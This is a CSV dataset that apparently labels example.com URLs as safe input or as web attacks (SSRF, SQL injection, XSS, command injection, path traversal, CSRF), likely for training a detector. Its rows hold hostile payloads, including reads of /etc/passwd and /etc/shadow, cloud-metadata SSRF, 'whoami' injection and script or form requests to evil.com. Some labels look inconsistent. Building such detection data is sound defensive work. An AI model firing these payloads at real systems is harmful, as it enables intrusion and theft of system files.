URL,Attack_Type,Payload_Description
https://example.com/?q=name%3DJohnDoe,NONE,Safe input
https://example.com/?redirect=user123,NONE,Safe input
https://example.com/?input=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
https://example.com/?cmd=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?search=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?q=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?q=%26%26whoami,Command Injection,Command Injection payload: &&whoami
https://example.com/?content=name%3DJohnDoe,NONE,Safe input
https://example.com/?url=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?token=page%3Dhome,NONE,Safe input
https://example.com/?cmd=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
https://example.com/?token=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
https://example.com/?search=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?url=apple,NONE,Safe input
https://example.com/?user=feedback,NONE,Safe input
https://example.com/?q=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
https://example.com/?file=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
https://example.com/?search=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
https://example.com/?content=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?path=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
https://example.com/?search=query%3Dhelp,NONE,Safe input
https://example.com/?input=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?url=%26%26whoami,Command Injection,Command Injection payload: &&whoami
